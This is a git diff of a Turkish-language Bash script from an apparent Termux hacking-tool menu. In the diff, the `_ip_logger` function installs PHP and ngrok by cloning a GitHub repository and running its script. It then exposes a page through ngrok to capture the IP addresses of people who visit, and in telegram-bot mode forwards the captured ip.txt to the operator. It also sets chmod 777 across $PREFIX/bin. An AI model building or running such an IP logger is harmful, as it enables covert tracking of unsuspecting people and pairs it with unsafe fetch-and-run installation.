@@ -26,36 +26,6 @@ if [[ ! -a $PREFIX/bin/curl ]];then
 	pkg install curl -y
 fi
 
-# PHP  PAKET KONTROLÜ #
-
-if [[ ! -a $PREFIX/bin/php ]];then
-	echo
-	echo
-	echo
-	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
-	echo
-	echo
-	echo
-	pkg install php -y
-fi
-
-# NGROK KONTROLÜ #
-
-if [[ ! -a $PREFIX/bin/ngrok ]];then
-	echo
-	echo
-	echo
-	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
-	echo
-	echo
-	echo
-	git clone https://github.com/termuxxtoolss/ngrok-kurulum
-	cd ngrok-kurulum
-	bash ngrok-kurulum.sh
-	cd ..
-	rm -rf ngrok-kurulum
-fi
-
 if [[ $1 == update ]];then
 	cd files
 	./update.sh update
@@ -77,26 +47,20 @@ if [[ $kontrol == 0 ]];then
 	echo
 	exit
 fi
-# BİLDİRİM SCRİPT KONTROLÜ #
+# COMMANDS SCRİPT CONTROLS #
 
-if [[ -a files/termuxxtoolssmod ]];then
-	mv files/termuxxtoolssmod $PREFIX/bin
+if [[ -a files/commands/termuxxtoolssmod ]];then
+	mv files/commands/termuxxtoolssmod $PREFIX/bin
+	mv files/commands/link-create $PREFIX/bin
 	chmod 777 $PREFIX/bin/*
-fi
-control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
-if [[ -n $control ]];then
-	killall ngrok
-	killall php
 fi
 clear
 cd files
 ./update.sh
-cd ..
-if [[ -a updates_infos ]];then
-	rm updates_infos
+if [[ -a ../updates_infos ]];then
+	rm ../updates_infos
 	exit
 fi
-cd files
 if [[ $1 == "" ]];then
 	clear
 	bash banner.sh
@@ -243,6 +207,44 @@ rm .ip
 rm .scan-output.txt
 }
 _ip_logger(){
+	
+	control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
+	if [[ -n $control ]];then
+		killall ngrok
+		killall php
+	fi
+
+# PHP  PAKET KONTROLÜ #
+
+	if [[ ! -a $PREFIX/bin/php ]];then
+		echo
+		echo
+		echo
+		printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
+		echo
+		echo
+		echo
+		pkg install php -y
+	fi
+
+# NGROK KONTROLÜ #
+
+	if [[ ! -a $PREFIX/bin/ngrok ]];then
+		echo
+		echo
+		echo
+		printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
+		echo
+		echo
+		echo
+		git clone https://github.com/termuxxtoolss/ngrok-kurulum
+		cd ngrok-kurulum
+		bash ngrok-kurulum.sh
+		cd ..
+		rm -rf ngrok-kurulum
+	fi
+
+
 	if [[ -a ip.txt ]];then
 		rm ip.txt
 	fi
@@ -311,7 +313,14 @@ _ip_logger(){
 			echo
 			echo
 			echo
-			echo "[✓] BİLGİ ALINDI" > .info
+			control=$(cat $PREFIX/lib/.termuxxtollssmode |sed -n 2p)
+			if [[ $control == telegram-bot ]];then
+				echo "[✓] BİLGİ ALINDI" > .info
+				termuxxtoolssmod --send
+				echo -e "$(cat ip.txt)" > .info
+			else
+				echo "[✓] BİLGİ ALINDI" > .info
+			fi
 			termuxxtoolssmod --send
 			echo -e "
 	\t\t\e[1;33mBİLGİ ALINDI\n
